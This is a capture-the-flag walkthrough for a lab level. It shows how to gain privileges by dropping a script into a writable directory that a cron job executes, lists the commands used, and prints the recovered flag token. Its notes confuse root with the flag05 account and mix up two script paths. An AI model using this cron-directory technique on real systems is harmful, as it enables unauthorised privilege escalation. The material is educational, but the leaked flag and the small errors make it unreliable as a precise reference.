# Level05 Solution

## Steps:
1. Connected via SSH: `ssh level05@192.168.16.128 -p 4242`
2.When we are log as level05 we automatically receive a message :       You have new mail.
   After some research we can found the file level05 at /var/mail/level05
   - Command: `cat /var/mail/level05 `
   - Content:
     ```
      level05@SnowCrash:~$ cat /var/mail/level05 
      */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
     ```
   - This runs every 2 minutes as root.
3. Analyzed the script `/opt/openarenaserver`:
   - Code:
     ```bash
     #!/bin/bash
     for i in /opt/openarenaserver/* ; do
         (ulimit -t 5; bash -x "$i")
         rm -f "$i"
     done
     ```
   - It executes every file in `/opt/openarenaserver/` with `bash -x` and then deletes it.
4. Exploited the cron job:
   - Created a malicious script in `/opt/openarenaserver/`:
     ```bash
     echo "/bin/getflag > /tmp/token_result 2>&1" > /opt/openarenaserver/test

     chmod +x /opt/openarenaserver/test
     ```
   - Waited 2 minutes for the cron job to execute the script.
5. Retrieved the flag:
   - Command: ` cat /tmp/token_result`
   - Output: `viuaaale9huek52boumoomioc`

## Notes:
- The directory `/opt/openarenaserver/` is writable by the user `level05`.
- The cron job runs as root, so any script placed in that directory is executed with root privileges.
- The script is executed and then deleted, so we must write the output to a file (e.g., ` /tmp/token_result`).

## Tools used:
- `cat` (to view files)
- `echo` and `chmod` (to create the exploit script)
- Cron job exploitation

## Vulnerability:
- Misconfigured cron job that executes arbitrary files in a writable directory.